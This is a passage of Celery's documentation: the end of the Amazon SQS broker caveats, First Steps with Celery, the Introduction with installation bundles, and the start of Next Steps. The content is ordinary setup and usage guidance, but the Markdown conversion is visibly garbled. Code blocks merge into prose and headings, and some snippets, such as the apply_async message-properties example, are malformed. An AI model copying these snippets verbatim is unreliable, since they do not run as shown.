                'backoff_policy': {1: 10, 2: 20, 3: 40, 4: 80, 5: 320, 6: 640},
                'backoff_tasks': ['svc.tasks.tasks.task1']
            }
        },
    'sts_role_arn': 'arn:aws:iam::<xxx>:role/STSTest', # optional
    'sts_token_timeout': 900 # optional
    }

## Caveats

  - If a task isn't acknowledged within the `visibility_timeout`, the task will be redelivered to another worker and executed.
    
    This causes problems with ETA/countdown/retry tasks where the time to execute exceeds the visibility timeout; in fact if that happens it will be executed again, and again in a loop.
    
    So you have to increase the visibility timeout to match the time of the longest ETA you're planning to use.
    
    Note that Celery will redeliver messages at worker shutdown, so having a long visibility timeout will only delay the redelivery of 'lost' tasks in the event of a power failure or forcefully terminated workers.
    
    Periodic tasks won't be affected by the visibility timeout, as it is a concept separate from ETA/countdown.
    
    The maximum visibility timeout supported by AWS as of this writing is 12 hours (43200 seconds):
    
        broker_transport_options = {'visibility_timeout': 43200}

  - SQS doesn't yet support worker remote control commands.

  - SQS doesn't yet support events, and so cannot be used with `celery events`, `celerymon`, or the Django Admin monitor.

  - With FIFO queues it might be necessary to set additional message properties such as `MessageGroupId` and `MessageDeduplicationId` when publishing a message.
    
    Message properties can be passed as keyword arguments to \`\~celery.app.task.Task.apply\_async\`:
    
      - \`\`\`python
        
          - message\_properties = {  
            'MessageGroupId': '\<YourMessageGroupId\>', 'MessageDeduplicationId': '\<YourMessageDeduplicationId\>'
        
        } task.apply\_async(\*\*message\_properties)

  - During \[shutdown \<worker-stopping\>\](\#shutdown-\<worker-stopping\>), the worker will attempt to re-queue any unacknowledged messages with `task_acks_late` enabled. However, if the worker is terminated forcefully (\[cold shutdown \<worker-cold-shutdown\>\](\#cold-shutdown-\<worker-cold-shutdown\>)), the worker might not be able to re-queue the tasks on time, and they will not be consumed again until the \[sqs-visibility-timeout\](\#sqs-visibility-timeout) has passed. This creates a problem when the \[sqs-visibility-timeout\](\#sqs-visibility-timeout) is very high and a worker needs to shut down just after it has received a task. If the task is not re-queued in such case, it will need to wait for the long visibility timeout to pass before it can be consumed again, leading to potentially very long delays in tasks execution.
    
    The \[soft shutdown \<worker-soft-shutdown\>\](\#soft-shutdown-\<worker-soft-shutdown\>) introduces a time-limited warm shutdown phase just before the \[cold shutdown \<worker-cold-shutdown\>\](\#cold-shutdown-\<worker-cold-shutdown\>). This time window significantly increases the chances of re-queuing the tasks during shutdown which mitigates the problem of long visibility timeouts.
    
    To enable the \[soft shutdown \<worker-soft-shutdown\>\](\#soft-shutdown-\<worker-soft-shutdown\>), set the `worker_soft_shutdown_timeout` to a value greater than 0. The value must be an float describing the number of seconds. During this time, the worker will continue to process the running tasks until the timeout expires, after which the \[cold shutdown \<worker-cold-shutdown\>\](\#cold-shutdown-\<worker-cold-shutdown\>) will be initiated automatically to terminate the worker gracefully.
    
    If the \[REMAP\_SIGTERM \<worker-REMAP\_SIGTERM\>\](\#remap\_sigterm-\<worker-remap\_sigterm\>) is configured to SIGQUIT in the environment variables, and the `worker_soft_shutdown_timeout` is set, the worker will initiate the \[soft shutdown \<worker-soft-shutdown\>\](\#soft-shutdown-\<worker-soft-shutdown\>) when it receives the `TERM` signal (*and* the `QUIT` signal).

<div id="sqs-results-configuration">

Results `` ` -------  Multiple products in the Amazon Web Services family could be a good candidate to store or publish results with, but there's no such result backend included at this point.  > **Warning** >  Don't use the ``amqp\`\` result backend with SQS.

</div>

It will create one queue for every task, and the queues will not be collected. This could cost you money that would be better spent contributing an AWS result store backend back to Celery :)

---

first-steps-with-celery.md

---

# First Steps with Celery<span id="tut-celery"></span>

Celery is a task queue with batteries included. It's easy to use so that you can get started without learning the full complexities of the problem it solves. It's designed around best practices so that your product can scale and integrate with other languages, and it comes with the tools and support you need to run such a system in production.

In this tutorial you'll learn the absolute basics of using Celery.

Learn about:

  - Choosing and installing a message transport (broker).
  - Installing Celery and creating your first task.
  - Starting the worker and calling tasks.
  - Keeping track of tasks as they transition through different states, and inspecting return values.

Celery may seem daunting at first - but don't worry - this tutorial will get you started in no time. It's deliberately kept simple, so as to not confuse you with advanced features. After you have finished this tutorial, it's a good idea to browse the rest of the documentation. For example the \[next-steps\](\#next-steps) tutorial will showcase Celery's capabilities.

<div class="contents" data-local="">

</div>

## Choosing a Broker

Celery requires a solution to send and receive messages; usually this comes in the form of a separate service called a *message broker*.

There are several choices available, including:

### RabbitMQ

[RabbitMQ](http://www.rabbitmq.com/) is feature-complete, stable, durable and easy to install. It's an excellent choice for a production environment. Detailed information about using RabbitMQ with Celery:

> \[broker-rabbitmq\](\#broker-rabbitmq)

If you're using Ubuntu or Debian install RabbitMQ by executing this command:

`` `console     $ sudo apt-get install rabbitmq-server  Or, if you want to run it on Docker execute this:  .. code-block:: console      $ docker run -d -p 5672:5672 rabbitmq  When the command completes, the broker will already be running in the background, ``<span class="title-ref"> ready to move messages for you: </span><span class="title-ref">Starting rabbitmq-server: SUCCESS</span>\`.

Don't worry if you're not running Ubuntu or Debian, you can go to this website to find similarly simple installation instructions for other platforms, including Microsoft Windows:

> <http://www.rabbitmq.com/download.html>

### Redis

[Redis](https://redis.io/) is also feature-complete, but is more susceptible to data loss in the event of abrupt termination or power failures. Detailed information about using Redis:

\[broker-redis\](\#broker-redis)

If you want to run it on Docker execute this:

`` `console     $ docker run -d -p 6379:6379 redis  Other brokers ``\` -------------

In addition to the above, there are other experimental transport implementations to choose from, including \[Amazon SQS \<broker-sqs\>\](\#amazon-sqs-\<broker-sqs\>).

See \[broker-overview\](\#broker-overview) for a full list.

## Installing Celery

Celery is on the Python Package Index (PyPI), so it can be installed with standard Python tools like `pip`:

`` `console     $ pip install celery  Application ``\` ===========

The first thing you need is a Celery instance. We call this the *Celery application* or just *app* for short. As this instance is used as the entry-point for everything you want to do in Celery, like creating tasks and managing workers, it must be possible for other modules to import it.

In this tutorial we keep everything contained in a single module, but for larger projects you want to create a \[dedicated module \<project-layout\>\](\#dedicated-module-\<project-layout\>).

Let's create the file `tasks.py`:

`` `python     from celery import Celery      app = Celery('tasks', broker='pyamqp://guest@localhost//')      @app.task     def add(x, y):         return x + y  The first argument to `~celery.app.Celery` is the name of the current module. ``<span class="title-ref"> This is only needed so that names can be automatically generated when the tasks are defined in the </span>\_\_main\_\_\` module.

The second argument is the broker keyword argument, specifying the URL of the message broker you want to use. Here we are using RabbitMQ (also the default option).

See \[celerytut-broker\](\#celerytut-broker) above for more choices --for RabbitMQ you can use `amqp://localhost`, or for Redis you can use `redis://localhost`.

You defined a single task, called `add`, returning the sum of two numbers.

## Running the Celery worker server

You can now run the worker by executing our program with the `worker` argument:

`` `console     $ celery -A tasks worker --loglevel=INFO  > **Note** >      See the [celerytut-troubleshooting](#celerytut-troubleshooting) section if the worker     doesn't start.  In production you'll want to run the worker in the ``<span class="title-ref"> background as a daemon. To do this you need to use the tools provided by your platform, or something like \`supervisord</span>\_ (see \[daemonizing\](\#daemonizing) for more information).

For a complete listing of the command-line options available, do:

`` `console     $  celery worker --help  There are also several other commands available, and help is also available:  .. code-block:: console      $ celery --help    .. _celerytut-calling:  Calling the task ``\` ================

To call our task you can use the <span class="title-ref">\~@Task.delay</span> method.

This is a handy shortcut to the <span class="title-ref">\~@Task.apply\_async</span> method that gives greater control of the task execution (see \[guide-calling\](\#guide-calling)):

    >>> from tasks import add
    >>> add.delay(4, 4)

The task has now been processed by the worker you started earlier. You can verify this by looking at the worker's console output.

Calling a task returns an <span class="title-ref">\~@AsyncResult</span> instance. This can be used to check the state of the task, wait for the task to finish, or get its return value (or if the task failed, to get the exception and traceback).

Results are not enabled by default. In order to do remote procedure calls or keep track of task results in a database, you will need to configure Celery to use a result backend. This is described in the next section.

## Keeping Results

If you want to keep track of the tasks' states, Celery needs to store or send the states somewhere. There are several built-in result backends to choose from: [SQLAlchemy](http://www.sqlalchemy.org/)/[Django](http://djangoproject.com) ORM, [MongoDB](http://www.mongodb.org), [Memcached](http://memcached.org), [Redis](https://redis.io/), \[RPC \<conf-rpc-result-backend\>\](\#rpc-\<conf-rpc-result-backend\>) ([RabbitMQ](http://www.rabbitmq.com/)/AMQP), and -- or you can define your own.

For this example we use the <span class="title-ref">rpc</span> result backend, that sends states back as transient messages. The backend is specified via the `backend` argument to <span class="title-ref">@Celery</span>, (or via the `result_backend` setting if you choose to use a configuration module). So, you can modify this line in the <span class="title-ref">tasks.py</span> file to enable the <span class="title-ref">rpc://</span> backend:

`` `python     app = Celery('tasks', backend='rpc://', broker='pyamqp://')  Or if you want to use Redis as the result backend, but still use RabbitMQ as ``\` the message broker (a popular combination):

`` `python     app = Celery('tasks', backend='redis://localhost', broker='pyamqp://')  To read more about result backends please see [task-result-backends](#task-result-backends).  Now with the result backend configured, close the current python session and import the ``<span class="title-ref"> </span><span class="title-ref">tasks</span><span class="title-ref"> module again to put the changes into effect. This time you'll hold on to the </span>\~@AsyncResult\` instance returned when you call a task:

`` `pycon     >>> from tasks import add    # close and reopen to get updated 'app'     >>> result = add.delay(4, 4)  The `~@AsyncResult.ready` method returns whether the task ``\` has finished processing or not:

`` `pycon     >>> result.ready()     False  You can wait for the result to complete, but this is rarely used ``\` since it turns the asynchronous call into a synchronous one:

`` `pycon     >>> result.get(timeout=1)     8  In case the task raised an exception, `~@AsyncResult.get` will ``<span class="title-ref"> re-raise the exception, but you can override this by specifying the </span><span class="title-ref">propagate</span>\` argument:

`` `pycon     >>> result.get(propagate=False)   If the task raised an exception, you can also gain access to the ``\` original traceback:

`` `pycon     >>> result.traceback  > **Warning** >      Backends use resources to store and transmit results. To ensure     that resources are released, you must eventually call     `~@AsyncResult.get` or `~@AsyncResult.forget` on     EVERY `~@AsyncResult` instance returned after calling     a task.  See :mod:`celery.result` for the complete result object reference.  .. _celerytut-configuration:  Configuration ``\` =============

Celery, like a consumer appliance, doesn't need much configuration to operate. It has an input and an output. The input must be connected to a broker, and the output can be optionally connected to a result backend. However, if you look closely at the back, there's a lid revealing loads of sliders, dials, and buttons: this is the configuration.

The default configuration should be good enough for most use cases, but there are many options that can be configured to make Celery work exactly as needed. Reading about the options available is a good idea to familiarize yourself with what can be configured. You can read about the options in the \[configuration\](\#configuration) reference.

The configuration can be set on the app directly or by using a dedicated configuration module. As an example you can configure the default serializer used for serializing task payloads by changing the `task_serializer` setting:

`` `python     app.conf.task_serializer = 'json'  If you're configuring many settings at once you can use ``update`:  .. code-block:: python      app.conf.update(         task_serializer='json',         accept_content=['json'],  # Ignore other content         result_serializer='json',         timezone='Europe/Oslo',         enable_utc=True,     )  For larger projects, a dedicated configuration module is recommended.`\` Hard coding periodic task intervals and task routing options is discouraged. It is much better to keep these in a centralized location. This is especially true for libraries, as it enables users to control how their tasks behave. A centralized configuration will also allow your SysAdmin to make simple changes in the event of system trouble.

You can tell your Celery instance to use a configuration module by calling the <span class="title-ref">@config\_from\_object</span> method:

`` `python     app.config_from_object('celeryconfig')  This module is often called " ``celeryconfig`", but you can use any`\` module name.

In the above case, a module named `celeryconfig.py` must be available to load from the current directory or on the Python path. It could look something like this:

`celeryconfig.py`:

`` `python     broker_url = 'pyamqp://'     result_backend = 'rpc://'      task_serializer = 'json'     result_serializer = 'json'     accept_content = ['json']     timezone = 'Europe/Oslo'     enable_utc = True  To verify that your configuration file works properly and doesn't ``\` contain any syntax errors, you can try to import it:

`` `console     $ python -m celeryconfig  For a complete reference of configuration options, see [configuration](#configuration).  To demonstrate the power of configuration files, this is how you'd ``\` route a misbehaving task to a dedicated queue:

`celeryconfig.py`:

`` `python     task_routes = {         'tasks.add': 'low-priority',     }  Or instead of routing it you could rate limit the task ``\` instead, so that only 10 tasks of this type can be processed in a minute (10/m):

`celeryconfig.py`:

`` `python     task_annotations = {         'tasks.add': {'rate_limit': '10/m'}     }  If you're using RabbitMQ or Redis as the ``\` broker then you can also direct the workers to set a new rate limit for the task at runtime:

`` `console     $ celery -A tasks control rate_limit tasks.add 10/m     worker@example.com: OK         new rate limit set successfully  See [guide-routing](#guide-routing) to read more about task routing, ``<span class="title-ref"> and the :setting:\`task\_annotations</span> setting for more about annotations, or \[guide-monitoring\](\#guide-monitoring) for more about remote control commands and how to monitor what your workers are doing.

## Where to go from here

If you want to learn more you should continue to the \[Next Steps \<next-steps\>\](\#next-steps-\<next-steps\>) tutorial, and after that you can read the \[User Guide \<guide\>\](\#user-guide-\<guide\>).

## Troubleshooting

There's also a troubleshooting section in the \[faq\](\#faq).

### Worker doesn't start: Permission Error

  - If you're using Debian, Ubuntu or other Debian-based distributions:
    
    > Debian recently renamed the `/dev/shm` special file to `/run/shm`.
    > 
    > A simple workaround is to create a symbolic link:
    > 
    >   - \`\`\`console  
    >     \# ln -s /run/shm /dev/shm

  - Others:
    
    > If you provide any of the `--pidfile <celery worker --pidfile>`, `--logfile <celery worker --logfile>` or `--statedb <celery worker --statedb>` arguments, then you must make sure that they point to a file or directory that's writable and readable by the user starting the worker.

Result backend doesn't work or tasks are always in `PENDING` state `` ` --------------------------------------------------------------------  All tasks are :state:`PENDING` by default, so the state would've been better named "unknown". Celery doesn't update the state when a task is sent, and any task with no history is assumed to be pending (you know the task id, after all).  1) Make sure that the task doesn't have ``ignore\_result``enabled.      Enabling this option will force the worker to skip updating     states.  2) Make sure the :setting:`task_ignore_result` setting isn't enabled.  3) Make sure that you don't have any old workers still running.      It's easy to start multiple workers by accident, so make sure     that the previous worker is properly shut down before you start a new one.      An old worker that isn't configured with the expected result backend     may be running and is hijacking the tasks.      The :option:`--pidfile <celery worker --pidfile>` argument can be set to     an absolute path to make sure this doesn't happen.  4) Make sure the client is configured with the right backend.      If, for some reason, the client is configured to use a different backend     than the worker, you won't be able to receive the result.     Make sure the backend is configured correctly:``<span class="title-ref">pycon \>\>\> result = task.delay() \>\>\> print(result.backend) </span>\`\`

---

index.md

---

# Getting Started

  - Release  

  - Date  

<div class="toctree" data-maxdepth="2">

introduction backends-and-brokers/index first-steps-with-celery next-steps resources

</div>

---

introduction.md

---

# Introduction to Celery

<div class="contents" data-local="" data-depth="1">

</div>

## What's a Task Queue?

Task queues are used as a mechanism to distribute work across threads or machines.

A task queue's input is a unit of work called a task. Dedicated worker processes constantly monitor task queues for new work to perform.

Celery communicates via messages, usually using a broker to mediate between clients and workers. To initiate a task the client adds a message to the queue, the broker then delivers that message to a worker.

A Celery system can consist of multiple workers and brokers, giving way to high availability and horizontal scaling.

Celery is written in Python, but the protocol can be implemented in any language. In addition to Python there's [node-celery](https://github.com/mher/node-celery) and [node-celery-ts](https://github.com/IBM/node-celery-ts) for Node.js, and a [PHP client](https://github.com/gjedeer/celery-php).

Language interoperability can also be achieved exposing an HTTP endpoint and having a task that requests it (webhooks).

## What do I need?

<div class="sidebar" data-subtitle="Celery version 5.3 runs on">

**Version Requirements: Celery version 5.3 runs on**

  - Python ❨3.8, 3.9, 3.10, 3.11❩
  - PyPy3.8+ ❨v7.3.11+❩

Celery 4.x was the last version to support Python 2.7, Celery 5.x requires Python 3.6 or newer. Celery 5.1.x also requires Python 3.6 or newer. Celery 5.2.x requires Python 3.7 or newer.

If you're running an older version of Python, you need to be running an older version of Celery:

  - Python 2.7 or Python 3.5: Celery series 4.4 or earlier.
  - Python 2.6: Celery series 3.1 or earlier.
  - Python 2.5: Celery series 3.0 or earlier.
  - Python 2.4 was Celery series 2.2 or earlier.

Celery is a project with minimal funding, so we don't support Microsoft Windows. Please don't open any issues related to that platform.

</div>

*Celery* requires a message transport to send and receive messages. The RabbitMQ and Redis broker transports are feature complete, but there's also support for a myriad of other experimental solutions, including using SQLite for local development.

*Celery* can run on a single machine, on multiple machines, or even across data centers.

## Get Started

If this is the first time you're trying to use Celery, or if you haven't kept up with development in the 3.1 version and are coming from previous versions, then you should read our getting started tutorials:

  - \[first-steps\](\#first-steps)
  - \[next-steps\](\#next-steps)

## Celery is…

<div class="topic">

**\\**

  - **Simple**
    
    > Celery is easy to use and maintain, and it *doesn't need configuration files*.
    > 
    > It has an active, friendly community you can talk to for support, including a [mailing-list](https://groups.google.com/group/celery-users) and an \[IRC channel \<irc-channel\>\](\#irc-channel-\<irc-channel\>).
    > 
    > Here's one of the simplest applications you can make:
    > 
    >   - \`\`\`python  
    >     from celery import Celery
    >     
    >     app = Celery('hello', broker='amqp://<guest@localhost>//')
    >     
    >     @app.task def hello(): return 'hello world'

  - **Highly Available**
    
    > Workers and clients will automatically retry in the event of connection loss or failure, and some brokers support HA in way of *Primary/Primary* or *Primary/Replica* replication.

  - **Fast**
    
    > A single Celery process can process millions of tasks a minute, with sub-millisecond round-trip latency (using RabbitMQ, librabbitmq, and optimized settings).

  - **Flexible**
    
    > Almost every part of *Celery* can be extended or used on its own, Custom pool implementations, serializers, compression schemes, logging, schedulers, consumers, producers, broker transports, and much more.

</div>

<div class="topic">

**It supports**

<div class="hlist" data-columns="2">

  - **Brokers**
    
    >   - \[RabbitMQ \<broker-rabbitmq\>\](\#rabbitmq-\<broker-rabbitmq\>), \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>),
    >   - \[Amazon SQS \<broker-sqs\>\](\#amazon-sqs-\<broker-sqs\>), and more…

  - **Concurrency**
    
    >   - prefork (multiprocessing),
    >   - [Eventlet](http://eventlet.net/), [gevent](http://gevent.org/)
    >   - thread (multithreaded)
    >   - <span class="title-ref">solo</span> (single threaded)

  - **Result Stores**
    
    >   - AMQP, Redis
    >   - Memcached,
    >   - SQLAlchemy, Django ORM
    >   - Apache Cassandra, Elasticsearch, Riak
    >   - MongoDB, CouchDB, Couchbase, ArangoDB
    >   - Amazon DynamoDB, Amazon S3
    >   - Microsoft Azure Block Blob, Microsoft Azure Cosmos DB
    >   - Google Cloud Storage
    >   - File system

  - **Serialization**
    
    >   - *pickle*, *json*, *yaml*, *msgpack*.
    >   - *zlib*, *bzip2* compression.
    >   - Cryptographic message signing.

</div>

</div>

Features `` ` ========  .. topic:: \      .. hlist::         :columns: 2          - **Monitoring**              A stream of monitoring events is emitted by workers and             is used by built-in and external tools to tell you what             your cluster is doing -- in real-time.              [Read more… <guide-monitoring>](#read-more…-<guide-monitoring>).          - **Work-flows**              Simple and complex work-flows can be composed using             a set of powerful primitives we call the "canvas",             including grouping, chaining, chunking, and more.              [Read more… <guide-canvas>](#read-more…-<guide-canvas>).          - **Time & Rate Limits**              You can control how many tasks can be executed per second/minute/hour,             or how long a task can be allowed to run, and this can be set as             a default, for a specific worker or individually for each task type.              [Read more… <worker-time-limits>](#read-more…-<worker-time-limits>).          - **Scheduling**              You can specify the time to run a task in seconds or a             `~datetime.datetime`, or you can use             periodic tasks for recurring events based on a             simple interval, or Crontab expressions             supporting minute, hour, day of week, day of month, and             month of year.              [Read more… <guide-beat>](#read-more…-<guide-beat>).          - **Resource Leak Protection**              The :option:`--max-tasks-per-child <celery worker --max-tasks-per-child>`             option is used for user tasks leaking resources, like memory or             file descriptors, that are simply out of your control.              [Read more… <worker-max-tasks-per-child>](#read-more…-<worker-max-tasks-per-child>).          - **User Components**              Each worker component can be customized, and additional components             can be defined by the user. The worker is built up using "bootsteps" — a             dependency graph enabling fine grained control of the worker's             internals.     Framework Integration =====================  Celery is easy to integrate with web frameworks, some of them even have integration packages:      +--------------------+------------------------+     | `Pyramid`_         | :pypi:`pyramid_celery` |     +--------------------+------------------------+     | `Pylons`_          | :pypi:`celery-pylons`  |     +--------------------+------------------------+     | `Flask`_           | not needed             |     +--------------------+------------------------+     | `web2py`_          | :pypi:`web2py-celery`  |     +--------------------+------------------------+     | `Tornado`_         | :pypi:`tornado-celery` |     +--------------------+------------------------+     | `Tryton`_          | :pypi:`celery_tryton`  |     +--------------------+------------------------+  For `Django`_ see [django-first-steps](#django-first-steps).  The integration packages aren't strictly necessary, but they can make development easier, and sometimes they add important hooks like closing database connections at :manpage:`fork(2)`.            Quick Jump ==========  .. topic:: I want to ⟶      .. hlist::         :columns: 2          - [get the return value of a task <task-states>](#get-the-return-value-of-a-task-<task-states>)         - [use logging from my task <task-logging>](#use-logging-from-my-task-<task-logging>)         - [learn about best practices <task-best-practices>](#learn-about-best-practices-<task-best-practices>)         - [create a custom task base class <task-custom-classes>](#create-a-custom-task-base-class-<task-custom-classes>)         - [add a callback to a group of tasks <canvas-chord>](#add-a-callback-to-a-group-of-tasks-<canvas-chord>)         - [split a task into several chunks <canvas-chunks>](#split-a-task-into-several-chunks-<canvas-chunks>)         - [optimize the worker <guide-optimizing>](#optimize-the-worker-<guide-optimizing>)         - [see a list of built-in task states <task-builtin-states>](#see-a-list-of-built-in-task-states-<task-builtin-states>)         - [create custom task states <custom-states>](#create-custom-task-states-<custom-states>)         - [set a custom task name <task-names>](#set-a-custom-task-name-<task-names>)         - [track when a task starts <task-track-started>](#track-when-a-task-starts-<task-track-started>)         - [retry a task when it fails <task-retry>](#retry-a-task-when-it-fails-<task-retry>)         - [get the id of the current task <task-request-info>](#get-the-id-of-the-current-task-<task-request-info>)         - [know what queue a task was delivered to <task-request-info>](#know-what-queue-a-task-was-delivered-to-<task-request-info>)         - [see a list of running workers <monitoring-control>](#see-a-list-of-running-workers-<monitoring-control>)         - [purge all messages <monitoring-control>](#purge-all-messages-<monitoring-control>)         - [inspect what the workers are doing <monitoring-control>](#inspect-what-the-workers-are-doing-<monitoring-control>)         - [see what tasks a worker has registered <monitoring-control>](#see-what-tasks-a-worker-has-registered-<monitoring-control>)         - [migrate tasks to a new broker <monitoring-control>](#migrate-tasks-to-a-new-broker-<monitoring-control>)         - [see a list of event message types <event-reference>](#see-a-list-of-event-message-types-<event-reference>)         - [contribute to Celery <contributing>](#contribute-to-celery-<contributing>)         - [learn about available configuration settings <configuration>](#learn-about-available-configuration-settings-<configuration>)         - [get a list of people and companies using Celery <res-using-celery>](#get-a-list-of-people-and-companies-using-celery-<res-using-celery>)         - [write my own remote control command <worker-custom-control-commands>](#write-my-own-remote-control-command-<worker-custom-control-commands>)         - [change worker queues at runtime <worker-queues>](#change-worker-queues-at-runtime-<worker-queues>)  .. topic:: Jump to ⟶      .. hlist::         :columns: 4          - [Brokers <brokers>](#brokers-<brokers>)         - [Applications <guide-app>](#applications-<guide-app>)         - [Tasks <guide-tasks>](#tasks-<guide-tasks>)         - [Calling <guide-calling>](#calling-<guide-calling>)         - [Workers <guide-workers>](#workers-<guide-workers>)         - [Daemonizing <daemonizing>](#daemonizing-<daemonizing>)         - [Monitoring <guide-monitoring>](#monitoring-<guide-monitoring>)         - [Optimizing <guide-optimizing>](#optimizing-<guide-optimizing>)         - [Security <guide-security>](#security-<guide-security>)         - [Routing <guide-routing>](#routing-<guide-routing>)         - [Configuration <configuration>](#configuration-<configuration>)         - [Django <django>](#django-<django>)         - [Contributing <contributing>](#contributing-<contributing>)         - [Signals <signals>](#signals-<signals>)         - [FAQ <faq>](#faq-<faq>)         - [API Reference <apiref>](#api-reference-<apiref>)  .. _celery-installation:  Installation ============  You can install Celery either via the Python Package Index (PyPI) or from source.  To install using :command:`pip`: ``\`console $ pip install -U Celery

<div id="bundles">

Bundles `` ` -------  Celery also defines a group of bundles that can be used to install Celery and the dependencies for a given feature.  You can specify these in your requirements or on the :command:`pip` command-line by using brackets. Multiple bundles can be specified by separating them by commas. ``\`console $ pip install "celery\[librabbitmq\]"

</div>

> $ pip install "celery\[librabbitmq,redis,auth,msgpack\]"

The following bundles are available:

Serializers `` ` ~~~~~~~~~~~  : ``celery\[auth\]`:     for using the`auth`security serializer.  :`celery\[msgpack\]`:     for using the msgpack serializer.  :`celery\[yaml\]`:     for using the yaml serializer.  Concurrency ~~~~~~~~~~~  :`celery\[eventlet\]``:     for using the :pypi:`eventlet` pool.  :``celery\[gevent\]``:     for using the :pypi:`gevent` pool.  Transports and Backends ~~~~~~~~~~~~~~~~~~~~~~~  :``celery\[librabbitmq\]`:     for using the librabbitmq C library.  :`celery\[redis\]`:     for using Redis as a message transport or as a result backend.  :`celery\[sqs\]`:     for using Amazon SQS as a message transport (*experimental*).  :`celery\[tblib\]``:     for using the :setting:`task_remote_tracebacks` feature.  :``celery\[memcache\]``:     for using Memcached as a result backend (using :pypi:`pylibmc`)  :``celery\[pymemcache\]`:     for using Memcached as a result backend (pure-Python implementation).  :`celery\[cassandra\]`:     for using Apache Cassandra/Astra DB as a result backend with DataStax driver.  :`celery\[couchbase\]`:     for using Couchbase as a result backend.  :`celery\[arangodb\]`:     for using ArangoDB as a result backend.  :`celery\[elasticsearch\]`:     for using Elasticsearch as a result backend.  :`celery\[riak\]`:     for using Riak as a result backend.  :`celery\[dynamodb\]`:     for using AWS DynamoDB as a result backend.  :`celery\[zookeeper\]`:     for using Zookeeper as a message transport.  :`celery\[sqlalchemy\]`:     for using SQLAlchemy as a result backend (*supported*).  :`celery\[pyro\]`:     for using the Pyro4 message transport (*experimental*).  :`celery\[slmq\]`:     for using the SoftLayer Message Queue transport (*experimental*).  :`celery\[consul\]`:     for using the Consul.io Key/Value store as a message transport or result backend (*experimental*).  :`celery\[django\]`:     specifies the lowest version possible for Django support.      You should probably not use this in your requirements, it's here     for informational purposes only.  :`celery\[gcs\]`:     for using the Google Cloud Storage as a result backend (*experimental*).  :`celery\[gcpubsub\]`:     for using the Google Cloud Pub/Sub as a message transport (*experimental*)..    .. _celery-installing-from-source:  Downloading and installing from source --------------------------------------  Download the latest version of Celery from PyPI:  https://pypi.org/project/celery/  You can install it by doing the following,:`\`console $ tar xvfz celery-0.0.0.tar.gz $ cd celery-0.0.0 $ python setup.py build \# python setup.py install

The last command must be executed as a privileged user if `` ` you aren't currently using a virtualenv.  .. _celery-installing-from-git:  Using the development version -----------------------------  With pip ~~~~~~~~  The Celery development version also requires the development versions of :pypi:`kombu`, :pypi:`amqp`, :pypi:`billiard`, and :pypi:`vine`.  You can install the latest snapshot of these using the following pip commands: ``\`console $ pip install <https://github.com/celery/celery/zipball/main#egg=celery> $ pip install <https://github.com/celery/billiard/zipball/main#egg=billiard> $ pip install <https://github.com/celery/py-amqp/zipball/main#egg=amqp> $ pip install <https://github.com/celery/kombu/zipball/main#egg=kombu> $ pip install <https://github.com/celery/vine/zipball/main#egg=vine>

With git \`\`\` \~\~\~\~\~\~\~\~

Please see the \[Contributing \<contributing\>\](\#contributing-\<contributing\>) section.

---

next-steps.md

---

# Next Steps

The \[first-steps\](\#first-steps) guide is intentionally minimal. In this guide I'll demonstrate what Celery offers in more detail, including how to add Celery support for your application and library.

This document doesn't document all of Celery's features and best practices, so it's recommended that you also read the \[User Guide \<guide\>\](\#user-guide-\<guide\>)

<div class="contents" data-local="" data-depth="1">

</div>

## Using Celery in your Application

### Our Project

Project layout:

    src/
        proj/__init__.py
            /celery.py
            /tasks.py

#### `proj/celery.py`

<div class="literalinclude" data-language="python">

../../examples/next-steps/proj/celery.py

</div>

In this module you created our <span class="title-ref">@Celery</span> instance (sometimes referred to as the *app*). To use Celery within your project you simply import this instance.

  - The `broker` argument specifies the URL of the broker to use.
    
    > See \[celerytut-broker\](\#celerytut-broker) for more information.

  - The `backend` argument specifies the result backend to use.
    
    > It's used to keep track of task state and results. While results are disabled by default I use the RPC result backend here because I demonstrate how retrieving results work later. You may want to use a different backend for your application. They all have different strengths and weaknesses. If you don't need results, it's better to disable them. Results can also be disabled for individual tasks by setting the `@task(ignore_result=True)` option.
    > 
    > See \[celerytut-keeping-results\](\#celerytut-keeping-results) for more information.

  - The `include` argument is a list of modules to import when the worker starts. You need to add our tasks module here so that the worker is able to find our tasks.

#### `proj/tasks.py`

<div class="literalinclude" data-language="python">

../../examples/next-steps/proj/tasks.py

</div>

### Starting the worker

The `celery` program can be used to start the worker (you need to run the worker in the directory above <span class="title-ref">proj</span>, according to the example project layout the directory is <span class="title-ref">src</span>):

`` `console     $ celery -A proj worker -l INFO  When the worker starts you should see a banner and some messages::       --------------- celery@halcyon.local v4.0 (latentcall)      --- ***** -----      -- ******* ---- [Configuration]      - *** --- * --- . broker:      amqp://guest@localhost:5672//      - ** ---------- . app:         __main__:0x1012d8590      - ** ---------- . concurrency: 8 (processes)      - ** ---------- . events:      OFF (enable -E to monitor this worker)      - ** ----------      - *** --- * --- [Queues]      -- ******* ---- . celery:      exchange:celery(direct) binding:celery      --- ***** -----       [2012-06-08 16:23:51,078: WARNING/MainProcess] celery@halcyon.local has started.  -- The *broker* is the URL you specified in the broker argument in our ``celery`  `<span class="title-ref"> module. You can also specify a different broker on the command-line by using the :option:</span>-b \<celery -b\>\` option.

\-- *Concurrency* is the number of prefork worker process used to process your tasks concurrently. When all of these are busy doing work, new tasks will have to wait for one of the tasks to finish before it can be processed.

The default concurrency number is the number of CPU's on that machine (including cores). You can specify a custom number using the `celery worker -c` option. There's no recommended value, as the optimal number depends on a number of factors, but if your tasks are mostly I/O-bound then you can try to increase it. Experimentation has shown that adding more than twice the number of CPU's is rarely effective, and likely to degrade performance instead.

Including the default prefork pool, Celery also supports using Eventlet, Gevent, and running in a single thread (see \[concurrency\](\#concurrency)).

\-- *Events* is an option that causes Celery to send monitoring messages (events) for actions occurring in the worker. These can be used by monitor programs like `celery events`, and Flower -- the real-time Celery monitor, which you can read about in the \[Monitoring and Management guide \<guide-monitoring\>\](\#monitoring-and-management-guide-\<guide-monitoring\>).

\-- *Queues* is the list of queues that the worker will consume tasks from. The worker can be told to consume from several queues at once, and this is used to route messages to specific workers as a means for Quality of Service, separation of concerns, and prioritization, all described in the \[Routing Guide \<guide-routing\>\](\#routing-guide \<guide-routing\>).

You can get a complete list of command-line arguments by passing in the `!--help` flag:

`` `console     $ celery worker --help  These options are described in more detailed in the [Workers Guide <guide-workers>](#workers-guide-<guide-workers>).  Stopping the worker ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

To stop the worker simply hit `Control-c`. A list of signals supported by the worker is detailed in the \[Workers Guide \<guide-workers\>\](\#workers-guide-\<guide-workers\>).

#### In the background

